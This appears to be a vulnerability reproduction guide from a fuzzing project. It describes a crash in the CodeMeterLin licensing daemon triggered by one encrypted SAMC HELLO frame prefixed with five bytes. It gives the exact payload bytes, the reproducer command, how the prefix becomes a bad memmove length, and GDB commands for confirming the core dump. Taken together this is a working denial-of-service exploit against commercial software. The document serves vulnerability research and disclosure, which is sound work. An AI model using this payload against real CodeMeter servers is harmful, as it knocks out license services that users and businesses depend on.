# Reproducing The Prefixed-HELLO Crash

This document gives the deterministic reproduction procedure for the
`CodeMeterLin + 0x8f431d` crash.

## Target

Validated against:

- Package: `CodeMeter-8.40.7154-505.x86_64`
- CodeMeterLin build: 8.40e of 2026-Mar-06 / Build 7154
- Binary sha256: `6bf82aa09b7f9696b4bf7535a7cb9a2fee62be5220952f2c237b6c73cbe09917`
- Host OS: openSUSE Tumbleweed, x86_64

## Prerequisites

- `CodeMeterLin` listening on `127.0.0.1:22350`
- Python 3 with `cryptography`
- The captured SAMC session data in `fuzzer/samc_session_data.py`
- Optional but recommended: raw core collection enabled under
  `/var/tmp/cm_cores`

Confirm the daemon is listening:

```bash
systemctl is-active codemeter
ss -tln '( sport = :22350 )'
pgrep -x CodeMeterLin
```

## One-Packet Reproducer

Run:

```bash
python3 fuzzer/repro_prefixed_hello.py
```

The script builds a valid encrypted SAMC client-to-daemon frame using the same
time-derived AES/CRC framing as the fuzzer. The cleartext is:

```text
5e 35 5e d6 f2 || canonical HELLO with fresh client token
```

It sends only that one frame.

Expected output shape:

```text
before_pid=<CodeMeterLin pid>
plaintext_len=189
plaintext_head=5e355ed6f20a00000000000010000028
response_wire_len=None
after_pid=None
crashed=True
```

If systemd restarts CodeMeter automatically, `after_pid` may be a new PID
instead of `None`. Treat either a PID change or a new `core.CodeMeterLin.*`
file as success.

Restart the daemon after reproducing:

```bash
sudo systemctl start codemeter
```

## Manual Equivalent

The reproducer does this:

1. Load the canonical HELLO plaintext.
2. Substitute a fresh 4-byte client token at the HELLO token offset.
3. Prefix the HELLO with `5e355ed6f2`.
4. Encrypt and MAC it as a normal SAMC C2D frame.
5. Send the resulting wire frame to `127.0.0.1:22350`.

The first 16 cleartext bytes are:

```text
5e 35 5e d6 f2 0a 00 00 00 00 00 00 10 00 00 28
```

When parsed as little-endian words by the vulnerable path:

```text
0xd65e355e
0x00000af2
0x00000000
0x28000010
```

The final word becomes the bad copy length.

## Core Validation

On the validation host the deterministic run produced:

```text
/var/tmp/cm_cores/core.CodeMeterLin.580674.1776764065
```

Minimal GDB validation:

```bash
sudo gdb -q -nx -batch \
  -ex 'set debuginfod enabled off' \
  -ex 'bt' \
  -ex 'info registers rip rbx rbp r12 r14 rsi rdi r15' \
  -ex 'p/x $_siginfo._sifields._sigfault.si_addr' \
  -ex 'frame 3' \
  -ex 'info registers rbx r15' \
  -ex 'x/8wx $rbx' \
  -ex 'x/16wx $r15+0x60' \
  /usr/sbin/CodeMeterLin /var/tmp/cm_cores/core.CodeMeterLin.580674.1776764065
```

Expected facts:

```text
#0 libc __memmove_evex_unaligned_erms
#1 CodeMeterLin + 0x8f431d
rbx = 0x28000010

parsed buffer:
  +0x00 = 0xd65e355e
  +0x04 = 0x00000af2
  +0x08 = 0x00000000
  +0x0c = 0x28000010

parser object:
  this + 0x68 = 0x28000010
```

## Attribution Harness

The deterministic packet was isolated with
[`fuzzer/samc_light_supervisor.py`](fuzzer/samc_light_supervisor.py).

Representative run:

```bash
python3 fuzzer/samc_light_supervisor.py \
  --out-dir /home/avj/clones/ax_fuzz/output/light_supervisor_mixed2_$(date +%Y%m%d_%H%M%S) \
  --workers 16 \
  --mode mixed \
  --iterations 10000000 \
  --ring-size 100 \
  --seed-base 0xC0D30000 \
  --timeout 900
```

The successful attribution run stopped after 49,944 attempts and preserved the
triggering attempt at:

```text
/home/avj/clones/ax_fuzz/output/light_supervisor_mixed2_20260421_103043/worker_09/ring/iter_00004667/
```

Attempt metadata:

```text
target frame: 0 (HELLO)
mutation:     insert_rand
insert pos:   0
insert bytes: 5e355ed6f2
```
